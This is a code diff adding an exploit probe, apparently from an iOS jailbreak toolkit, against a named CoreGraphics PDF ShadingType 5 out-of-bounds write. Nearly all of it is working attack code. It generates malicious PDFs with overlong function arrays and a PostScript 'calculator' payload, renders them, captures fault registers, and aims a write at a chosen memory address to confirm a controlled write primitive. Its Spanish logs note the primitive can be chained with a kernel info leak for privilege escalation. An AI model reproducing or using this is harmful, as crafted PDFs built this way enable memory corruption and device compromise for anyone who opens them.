@@ -28328,3 +28328,548 @@ void iosurface_m2scaler_fuzz(ISRLogBlock log, ISRDoneBlock done) {
         done(res);
     });
 }
+
+// =============================================================================
+// PROBE JB25: CVE-2026-112611 — CoreGraphics PDF ShadingType 5 OOB Write
+// =============================================================================
+#pragma mark - JB25: CoreGraphics PDF OOB Write
+
+#include <signal.h>
+#include <setjmp.h>
+#include <sys/mman.h>
+#include <mach-o/dyld.h>
+#include <mach-o/loader.h>
+#include <time.h>
+
+// Forward declarations for CoreGraphics via dlsym
+typedef const void *CGPDFDocumentRef_t;
+typedef const void *CGPDFPageRef_t;
+
+static const uint64_t JB25_SENTINEL = 0x4141414141414141ULL;
+#define JB25_VPR 64
+#define JB25_ROWS 2
+#define JB25_NOUT 2816
+
+struct jb25_jb_holder { sigjmp_buf b; };
+static volatile sig_atomic_t jb25_in_probe = 0;
+static struct jb25_jb_holder *jb25_jb_ptr = NULL;
+static volatile sig_atomic_t jb25_in_handler = 0;
+static volatile unsigned long jb25_far = 0;
+static volatile unsigned long jb25_esr = 0;
+static volatile unsigned long jb25_pc = 0;
+static volatile unsigned long jb25_xreg[29];
+static volatile int jb25_sig = 0;
+
+static void jb25_fault_handler(int sig, siginfo_t *si, void *uc) {
+    (void)si;
+    if (jb25_in_handler) _exit(11);
+    jb25_in_handler = 1;
+    if (!jb25_in_probe) _exit(9);
+    ucontext_t *u = (ucontext_t *)uc;
+    if (u) {
+        jb25_far = u->uc_mcontext->__es.__far;
+        jb25_esr = u->uc_mcontext->__es.__esr;
+        jb25_pc  = u->uc_mcontext->__ss.__pc;
+        for (int i = 0; i < 29; i++) jb25_xreg[i] = u->uc_mcontext->__ss.__x[i];
+    }
+    jb25_sig = sig;
+    jb25_in_handler = 0;
+    if (jb25_jb_ptr) siglongjmp(jb25_jb_ptr->b, 1);
+    _exit(12);
+}
+
+static void jb25_setup(void) {
+    static char *altstack_mem = NULL;
+    if (!altstack_mem) {
+        size_t sz = 256 * 1024;
+        altstack_mem = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+        if (altstack_mem == MAP_FAILED) { altstack_mem = NULL; return; }
+        stack_t ss;
+        ss.ss_sp = altstack_mem;
+        ss.ss_size = sz;
+        ss.ss_flags = 0;
+        sigaltstack(&ss, NULL);
+    }
+    if (!jb25_jb_ptr) {
+        jb25_jb_ptr = mmap(NULL, sizeof(struct jb25_jb_holder), PROT_READ | PROT_WRITE,
+                           MAP_PRIVATE | MAP_ANON, -1, 0);
+        if (jb25_jb_ptr == MAP_FAILED) jb25_jb_ptr = NULL;
+    }
+    struct sigaction sa;
+    memset(&sa, 0, sizeof sa);
+    sa.sa_sigaction = jb25_fault_handler;
+    sa.sa_flags = SA_SIGINFO | SA_NODEFER | SA_ONSTACK;
+    sigemptyset(&sa.sa_mask);
+    sigaction(SIGSEGV, &sa, NULL);
+    sigaction(SIGBUS, &sa, NULL);
+    sigaction(SIGABRT, &sa, NULL);
+}
+
+static size_t jb25_build_vertices(unsigned char *vs, size_t cap) {
+    size_t vn = 0;
+    unsigned acc = 0;
+    int nb = 0;
+    for (int i = 0; i < JB25_VPR * JB25_ROWS; i++) {
+        unsigned vals[3] = { (unsigned)(0x1000 + (i % JB25_VPR) * 10),
+                             (unsigned)(0x1000 + (i / JB25_VPR) * 10), 0u };
+        int widths[3] = { 32, 32, 8 };
+        for (int k = 0; k < 3; k++)
+            for (int b = widths[k] - 1; b >= 0; b--) {
+                acc = (acc << 1) | ((vals[k] >> b) & 1u);
+                if (++nb == 8) {
+                    if (vn < cap) vs[vn++] = (unsigned char)(acc & 0xFF);
+                    acc = 0; nb = 0;
+                }
+            }
+    }
+    if (nb && vn < cap) vs[vn++] = (unsigned char)((acc << (8 - nb)) & 0xFF);
+    return vn;
+}
+
+static int jb25_build_pdf_type2(const char *path, uint64_t bits) {
+    FILE *f = fopen(path, "wb");
+    if (!f) return -1;
+    unsigned char vs[2048];
+    size_t vn = jb25_build_vertices(vs, sizeof vs);
+
+    long off[6];
+    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+    fflush(f); off[0] = ftell(f);
+    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+    fflush(f); off[1] = ftell(f);
+    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+    fflush(f); off[2] = ftell(f);
+    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+    fflush(f); off[3] = ftell(f);
+    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+    fflush(f); off[4] = ftell(f);
+
+    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
+               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n",
+            JB25_VPR, vn);
+    fwrite(vs, 1, vn, f);
+    fprintf(f, "\nendstream\nendobj\n");
+    fflush(f); off[5] = ftell(f);
+
+    double d;
+    memcpy(&d, &bits, 8);
+    fprintf(f, "6 0 obj\n<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [");
+    for (int i = 0; i < JB25_NOUT; i++) fprintf(f, " %.340f", d);
+    fprintf(f, "] /C1 [");
+    for (int i = 0; i < JB25_NOUT; i++) fprintf(f, " 1.0");
+    fprintf(f, "] >>\nendobj\n");
+
+    long xref;
+    fflush(f); xref = ftell(f);
+    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
+    for (int i = 0; i < 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
+    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
+    fclose(f);
+    return 0;
+}
+
+static int jb25_build_pdf_type4(const char *path, uint64_t mantissa) {
+    FILE *f = fopen(path, "wb");
+    if (!f) return -1;
+    unsigned char vs[2048];
+    size_t vn = jb25_build_vertices(vs, sizeof vs);
+
+    long off[6];
+    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+    fflush(f); off[0] = ftell(f);
+    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+    fflush(f); off[1] = ftell(f);
+    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+    fflush(f); off[2] = ftell(f);
+    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+    fflush(f); off[3] = ftell(f);
+    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+    fflush(f); off[4] = ftell(f);
+
+    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
+               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n",
+            JB25_VPR, vn);
+    fwrite(vs, 1, vn, f);
+    fprintf(f, "\nendstream\nendobj\n");
+    fflush(f); off[5] = ftell(f);
+
+    size_t cap = (size_t)JB25_NOUT * 8 + 512;
+    char *body = malloc(cap);
+    if (!body) { fclose(f); return -1; }
+    size_t n = 0;
+    n += snprintf(body + n, cap - n, "{ pop %llu 2 -1074 exp mul",
+                  (unsigned long long)mantissa);
+    for (int i = 1; i < JB25_NOUT; i++)
+        n += snprintf(body + n, cap - n, " dup");
+    n += snprintf(body + n, cap - n, " }");
+
+    fprintf(f, "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [");
+    for (int i = 0; i < JB25_NOUT; i++) fprintf(f, " 0 1");
+    fprintf(f, "] /Length %zu >>\nstream\n%s\nendstream\nendobj\n", n, body);
+    free(body);
+
+    long xref;
+    fflush(f); xref = ftell(f);
+    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
+    for (int i = 0; i < 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
+    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
+    fclose(f);
+    return 0;
+}
+
+static int jb25_render(const char *path) {
+    typedef void *(*CGPDFDocCreateFn)(void *);
+    typedef void *(*CGPDFDocGetPageFn)(void *, size_t);
+    typedef void (*CGPDFDocReleaseFn)(void *);
+    typedef void *(*CGColorSpaceCreateFn)(void);
+    typedef void (*CGColorSpaceReleaseFn)(void *);
+    typedef void *(*CGBitmapContextCreateFn)(void *, size_t, size_t, size_t, size_t, void *, uint32_t);
+    typedef void (*CGContextDrawPDFPageFn)(void *, void *);
+    typedef void (*CGContextReleaseFn)(void *);
+    typedef void *(*CFURLCreateFn)(void *, const uint8_t *, long, int);
+    typedef void (*CFReleaseFn)(void *);
+
+    CGPDFDocCreateFn docCreate = dlsym(RTLD_DEFAULT, "CGPDFDocumentCreateWithURL");
+    CGPDFDocGetPageFn docGetPage = dlsym(RTLD_DEFAULT, "CGPDFDocumentGetPage");
+    CGPDFDocReleaseFn docRelease = dlsym(RTLD_DEFAULT, "CGPDFDocumentRelease");
+    CGColorSpaceCreateFn csCreate = dlsym(RTLD_DEFAULT, "CGColorSpaceCreateDeviceRGB");
+    CGColorSpaceReleaseFn csRelease = dlsym(RTLD_DEFAULT, "CGColorSpaceRelease");
+    CGBitmapContextCreateFn bmpCreate = dlsym(RTLD_DEFAULT, "CGBitmapContextCreate");
+    CGContextDrawPDFPageFn ctxDraw = dlsym(RTLD_DEFAULT, "CGContextDrawPDFPage");
+    CGContextReleaseFn ctxRelease = dlsym(RTLD_DEFAULT, "CGContextRelease");
+    CFURLCreateFn urlCreate = dlsym(RTLD_DEFAULT, "CFURLCreateFromFileSystemRepresentation");
+    CFReleaseFn cfRelease = dlsym(RTLD_DEFAULT, "CFRelease");
+
+    if (!docCreate || !docGetPage || !docRelease || !csCreate || !bmpCreate || !ctxDraw || !ctxRelease || !urlCreate || !cfRelease)
+        return 1;
+
+    void *u = urlCreate(NULL, (const uint8_t *)path, (long)strlen(path), 0);
+    if (!u) return 1;
+    void *doc = docCreate(u);
+    cfRelease(u);
+    if (!doc) return 1;
+    void *page = docGetPage(doc, 1);
+    if (!page) { docRelease(doc); return 1; }
+    void *cs = csCreate();
+    void *ctx = bmpCreate(NULL, 64, 64, 8, 0, cs, 1); // kCGImageAlphaPremultipliedLast=1
+    if (csRelease) csRelease(cs);
+    if (!ctx) { docRelease(doc); return 1; }
+    ctxDraw(ctx, page);
+    ctxRelease(ctx);
+    docRelease(doc);
+    return 0;
+}
+
+static void jb25_probe(int kind, uint64_t value) {
+    const char *tmp = getenv("TMPDIR");
+    if (!tmp || !*tmp) tmp = "/tmp";
+    char path[512];
+    snprintf(path, sizeof path, "%s/jb25probe.pdf", tmp);
+
+    jb25_far = 0; jb25_esr = 0; jb25_pc = 0; jb25_sig = 0;
+
+    int rc = (kind == 4) ? jb25_build_pdf_type4(path, value)
+                         : jb25_build_pdf_type2(path, value);
+    if (rc != 0) { jb25_sig = -1; return; }
+
+    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+        jb25_in_probe = 1;
+        jb25_render(path);
+        jb25_in_probe = 0;
+    } else {
+        jb25_in_probe = 0;
+    }
+    unlink(path);
+}
+
+static int jb25_is_write(void) { return jb25_sig > 0 && ((jb25_esr >> 6) & 1); }
+
+// Fingerprint cg_shading_type5_draw
+static const unsigned char jb25_prologue[16] = {
+    0xd5, 0x03, 0x23, 0x7f, 0x6d, 0xb9, 0x23, 0xe9,
+    0xa9, 0x01, 0x6f, 0xfc, 0xa9, 0x02, 0x67, 0xfa,
+};
+
+void iosurface_cg_oob_write(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB25: === CVE-2026-112611: CoreGraphics PDF ShadingType 5 OOB Write ===");
+        log(@"JB25: Genera PDFs maliciosos para triggear write primitivo en cg_shading_type5_draw");
+
+        jb25_setup();
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        // === FASE 0: Fingerprint cg_shading_type5_draw ===
+        log(@"JB25: === Fase 0: Fingerprint de CoreGraphics ===");
+        {
+            uint32_t n = _dyld_image_count();
+            int found = 0;
+            for (uint32_t i = 0; i < n && !found; i++) {
+                const char *name = _dyld_get_image_name(i);
+                if (!name || !strstr(name, "CoreGraphics")) continue;
+                const struct mach_header_64 *mh =
+                    (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(i);
+                if (!mh || mh->magic != MH_MAGIC_64) continue;
+                intptr_t slide = _dyld_get_image_vmaddr_slide(i);
+                uint64_t text_addr = 0, text_size = 0;
+                const struct load_command *lc =
+                    (const struct load_command *)((const char *)mh + sizeof(*mh));
+                for (uint32_t k = 0; k < mh->ncmds && lc; k++) {
+                    if (lc->cmd == LC_SEGMENT_64) {
+                        const struct segment_command_64 *sc = (const void *)lc;
+                        if (strcmp(sc->segname, "__TEXT") == 0) {
+                            text_addr = sc->vmaddr + slide;
+                            text_size = sc->vmsize;
+                        }
+                    }
+                    lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+                }
+                if (!text_size) continue;
+                const unsigned char *p = (const unsigned char *)(uintptr_t)text_addr;
+                for (uint64_t o = 0; o + 16 < text_size; o += 4) {
+                    if (memcmp(p + o, jb25_prologue, 16) == 0) {
+                        found = 1;
+                        log([NSString stringWithFormat:@"JB25: [OK] cg_shading_type5_draw encontrado en %s", name]);
+                        log([NSString stringWithFormat:@"JB25:   base=%#llx offset=%#llx",
+                             (unsigned long long)(uintptr_t)mh, (unsigned long long)(text_addr + o - (uint64_t)(uintptr_t)mh)]);
+                        // Dump bytes at +0x740 (the fault offset)
+                        if (o + 0x760 < text_size) {
+                            log([NSString stringWithFormat:@"JB25:   +0x740: %02x%02x%02x%02x %02x%02x%02x%02x",
+                                 p[o+0x740], p[o+0x741], p[o+0x742], p[o+0x743],
+                                 p[o+0x744], p[o+0x745], p[o+0x746], p[o+0x747]]);
+                        }
+                        results[@"fnFound"] = @YES;
+                        results[@"fnOffset"] = [NSString stringWithFormat:@"%#llx", (unsigned long long)(text_addr + o - (uint64_t)(uintptr_t)mh)];
+                        break;
+                    }
+                }
+            }
+            if (!found) {
+                log(@"JB25: [!!] cg_shading_type5_draw NO encontrado — prologue diferente en este build");
+                results[@"fnFound"] = @NO;
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // === FASE 1: Sweep /C0 length — find store fault ===
+        log(@"JB25: === Fase 1: Sweep /C0 length ===");
+        int storeFound = 0;
+        int loadFound = 0;
+        {
+            jb25_probe(2, JB25_SENTINEL);
+            if (jb25_sig > 0) {
+                int w = jb25_is_write();
+                int ours = 0;
+                for (int b = 0; b < 8; b++)
+                    if (((jb25_far >> (b * 8)) & 0xFF) == 0x41) ours++;
+
+                log([NSString stringWithFormat:@"JB25:   far=%#018lx WnR=%d %s",
+                     jb25_far, w ? 1 : 0, w ? "STORE" : "load"]);
+
+                if (w) {
+                    storeFound = 1;
+                    results[@"storeFault"] = @YES;
+                    results[@"storeFAR"] = [NSString stringWithFormat:@"%#018lx", jb25_far];
+                    results[@"storePC"] = [NSString stringWithFormat:@"%#018lx", jb25_pc];
+                    if (ours >= 2) {
+                        log(@"JB25: [OK] STORE fault con nuestro sentinel en la direccion!");
+                        results[@"addressControlled"] = @YES;
+                    }
+                } else {
+                    loadFound = 1;
+                    results[@"loadFault"] = @YES;
+                }
+            } else {
+                log(@"JB25: [!!] Sin fault — el renderer no llego al primitivo");
+                results[@"noFault"] = @YES;
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // === FASE 2: Register analysis ===
+        if (storeFound) {
+            log(@"JB25: === Fase 2: Analisis de registros ===");
+            log([NSString stringWithFormat:@"JB25:   pc  = %#018lx", jb25_pc]);
+            log([NSString stringWithFormat:@"JB25:   far = %#018lx", jb25_far]);
+            log([NSString stringWithFormat:@"JB25:   x8  = %#018lx (load source)", jb25_xreg[8]]);
+
+            int baseReg = -1;
+            unsigned long bestDelta = ~0UL;
+            for (int i = 0; i < 29; i++) {
+                unsigned long v = jb25_xreg[i];
+                if (v == 0) continue;
+                unsigned long d = (v > jb25_far) ? (v - jb25_far) : (jb25_far - v);
+                if (d < bestDelta) { bestDelta = d; baseReg = i; }
+            }
+            if (baseReg >= 0) {
+                log([NSString stringWithFormat:@"JB25:   base reg = x%d value=%#018lx delta=%#lx",
+                     baseReg, jb25_xreg[baseReg], bestDelta]);
+                results[@"baseReg"] = @(baseReg);
+            }
+
+            unsigned long offset = (jb25_far - JB25_SENTINEL) & 0xFFFFFFFFFFFFFFFFUL;
+            results[@"aimOffset"] = [NSString stringWithFormat:@"%#lx", offset];
+            if (offset < 0x100000) {
+                log([NSString stringWithFormat:@"JB25: [OK] Distancia de aim = %#lx", offset]);
+                results[@"offsetValid"] = @YES;
+            }
+
+            // Second value to check offset stability
+            jb25_probe(2, JB25_SENTINEL + 0x1000);
+            if (jb25_sig > 0) {
+                unsigned long offset2 = (jb25_far - (JB25_SENTINEL + 0x1000)) & 0xFFFFFFFFFFFFFFFFUL;
+                results[@"offsetStable"] = @(offset2 == offset);
+                log([NSString stringWithFormat:@"JB25:   Segunda medida: offset=%#lx %@",
+                     offset2, (offset2 == offset) ? @"ESTABLE" : @"INESTABLE"]);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // === FASE 3: Calculator route (Type 4 PostScript) ===
+        log(@"JB25: === Fase 3: Calculator route (Type 4) ===");
+        {
+            jb25_probe(4, 0x1ff40000ULL);
+            if (jb25_sig > 0 && jb25_is_write()) {
+                log([NSString stringWithFormat:@"JB25: [OK] Calculator llego al store! far=%#018lx", jb25_far]);
+                results[@"calculatorWorks"] = @YES;
+
+                unsigned long calOff = (jb25_far - 0x1ff40000UL) & 0xFFFFFFFFFFFFFFFFUL;
+                results[@"calculatorOffset"] = [NSString stringWithFormat:@"%#lx", calOff];
+                if (calOff < 0x100000) {
+                    log([NSString stringWithFormat:@"JB25: [OK] Calculator offset = %#lx — puede llevar cualquier direccion!", calOff]);
+                }
+            } else {
+                log(@"JB25: [!!] Calculator route no llego al store");
+                results[@"calculatorWorks"] = @NO;
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // === FASE 4: Aimed write test — write to our own memory ===
+        log(@"JB25: === Fase 4: Write test — escribir en memoria propia ===");
+        {
+            unsigned long calOff = 0;
+            NSString *calOffStr = results[@"calculatorOffset"];
+            if (calOffStr) {
+                unsigned long long v = 0;
+                sscanf([calOffStr UTF8String], "%llx", &v);
+                calOff = (unsigned long)v;
+            }
+
+            if (calOff > 0 && calOff < 0x100000) {
+                size_t blen = 1 << 20;
+                unsigned char *buf = mmap(NULL, blen, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+                if (buf != MAP_FAILED) {
+                    memset(buf, 0xAA, blen);
+                    unsigned long long target = (unsigned long long)(uintptr_t)buf + 0x8000;
+                    unsigned long long mantissa = (target - calOff) & 0xFFFFFFFFFFFFFFFFULL;
+
+                    log([NSString stringWithFormat:@"JB25:   buffer=%#llx target=+0x8000 mantissa=%#llx",
+                         (unsigned long long)(uintptr_t)buf, mantissa]);
+
+                    jb25_probe(4, mantissa);
+
+                    int changed = 0, first = -1;
+                    for (size_t k = 0; k < blen; k++) {
+                        if (buf[k] != 0xAA) { if (first < 0) first = (int)k; changed++; }
+                    }
+
+                    results[@"bytesChanged"] = @(changed);
+                    results[@"writeOffset"] = [NSString stringWithFormat:@"+%#x", first < 0 ? 0 : first];
+
+                    if (first == 0x8000) {
+                        log([NSString stringWithFormat:@"JB25: [!!!] WRITE PRIMITIVO CONFIRMADO — %d bytes escritos en +0x8000!", changed]);
+                        log(@"JB25: [!!!] La escritura aterrizo EXACTAMENTE donde apuntamos");
+                        results[@"writeConfirmed"] = @YES;
+                    } else if (changed > 0) {
+                        log([NSString stringWithFormat:@"JB25: [!!] Buffer cambio pero en +%#x en vez de +0x8000 (%d bytes)", first, changed]);
+                        results[@"writeConfirmed"] = @NO;
+                    } else {
+                        log(@"JB25: [--] Buffer sin cambios");
+                        results[@"writeConfirmed"] = @NO;
+                    }
+
+                    // === FASE 5: Permission boundary test ===
+                    if (!isr_stopped()) {
+                        log(@"JB25: === Fase 5: Boundary test — permisos MMU ===");
+                        size_t pg = 16384;
+                        unsigned char *np = mmap(NULL, pg * 4, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+                        unsigned char *ro = mmap(NULL, pg * 4, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+                        if (np != MAP_FAILED && ro != MAP_FAILED) {
+                            memset(np, 0xAA, pg * 4);
+                            memset(ro, 0xAA, pg * 4);
+                            mprotect(np + pg, pg, PROT_NONE);
+                            mprotect(ro + pg, pg, PROT_READ);
+
+                            // Try PROT_NONE
+                            unsigned long long tgt_none = (unsigned long long)(uintptr_t)(np + pg);
+                            unsigned long long m_none = (tgt_none - calOff) & 0xFFFFFFFFFFFFFFFFULL;
+                            jb25_probe(4, m_none);
+                            int none_faulted = jb25_is_write();
+                            log([NSString stringWithFormat:@"JB25:   PROT_NONE: %@ (far=%#018lx)",
+                                 none_faulted ? @"FAULT (rechazado)" : @"no fault", jb25_far]);
+                            results[@"protNoneRejected"] = @(none_faulted);
+
+                            // Try PROT_READ
+                            unsigned long long tgt_ro = (unsigned long long)(uintptr_t)(ro + pg);
+                            unsigned long long m_ro = (tgt_ro - calOff) & 0xFFFFFFFFFFFFFFFFULL;
+                            jb25_probe(4, m_ro);
+                            int ro_faulted = jb25_is_write();
+                            log([NSString stringWithFormat:@"JB25:   READ-ONLY: %@ (far=%#018lx)",
+                                 ro_faulted ? @"FAULT (rechazado)" : @"no fault", jb25_far]);
+                            results[@"protReadOnlyRejected"] = @(ro_faulted);
+
+                            if (none_faulted && ro_faulted) {
+                                log(@"JB25: [OK] MMU rechaza writes a paginas no-escribibles — confinado a userland writable");
+                            }
+
+                            munmap(np, pg * 4);
+                            munmap(ro, pg * 4);
+                        }
+                    }
+
+                    munmap(buf, blen);
+                }
+            } else {
+                log(@"JB25: [!!] Sin offset valido del calculator — no se puede aim");
+            }
+        }
+
+        // === VERDICT ===
+        log(@"JB25: =============================================");
+        NSString *verdict = @"NO_VULNERABILITY";
+        if ([results[@"writeConfirmed"] boolValue]) {
+            verdict = @"WRITE_PRIMITIVE_CONFIRMED";
+            log(@"JB25: [!!!] VEREDICTO: WRITE PRIMITIVE CONFIRMADO en iOS 27.0!");
+            log(@"JB25: Primitiva: 4 bytes zero-write a direccion elegida por PDF");
+            log(@"JB25: Combinable con kernel info leak para escalacion de privilegios");
+        } else if ([results[@"calculatorWorks"] boolValue]) {
+            verdict = @"CALCULATOR_ROUTE_OPEN";
+            log(@"JB25: Veredicto: Calculator route funciona pero write no confirmo");
+        } else if (storeFound) {
+            verdict = @"STORE_FAULT_REACHABLE";
+            log(@"JB25: Veredicto: Store fault alcanzable pero calculator no funciona");
+        } else if (loadFound) {
+            verdict = @"LOAD_FAULT_ONLY";
+            log(@"JB25: Veredicto: Solo load fault — el store no se ejecuta");
+        } else {
+            log(@"JB25: Veredicto: Sin vulnerabilidad en este build");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB25: Verdict: %@", verdict]);
+        log(@"JB25: =============================================");
+
+        isr_checkpoint(@"JB25-cg-oob-write-checkpoint.json", results);
+        done(results);
+
+    });
+}
